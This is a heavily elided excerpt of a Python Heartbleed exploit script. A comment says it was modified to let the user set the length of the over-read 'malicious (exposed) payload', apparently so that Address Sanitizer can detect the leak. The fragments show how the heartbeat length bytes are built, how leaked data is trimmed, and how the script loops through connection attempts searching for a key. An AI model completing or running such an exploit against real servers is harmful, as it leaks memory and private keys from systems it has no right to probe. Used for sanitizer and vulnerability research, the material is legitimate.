...
# Modified by Dmitrii Kuvaiskii
# Last Updated: 5/27/16
# -added option -l to specify length of malicious (exposed) payload
#    -note that Address Sanitizer detects only when length >= 0x9000 (36864 bytes)
#
...
options.add_option('-l', '--length', type='int', default=36864, help='Length of exposed payload (default: 36864 (0x9000) which is found by ASan)')
...
def build_heartbeat(tls_ver):
    hibyte = opts.length >> 8
    lobyte = opts.length & 0xFF
    heartbeat = [
    ...
    while True:
        ...
        if typ == 24:
            ...
            if len(pay) > 3:
                ...
                if opts.rawoutfile:
                    if len(pay) > 0x8000:  pay = pay[0x8000:]
    ...
    try:
        ...
        for x in range(0, opts.num):
            ...
            if keyfound:
                ...
                sys.stdout.write('\nPlease wait... connection attempt ' + str(x+1) + ' of ' + str(opts.num))
                sys.stdout.flush()
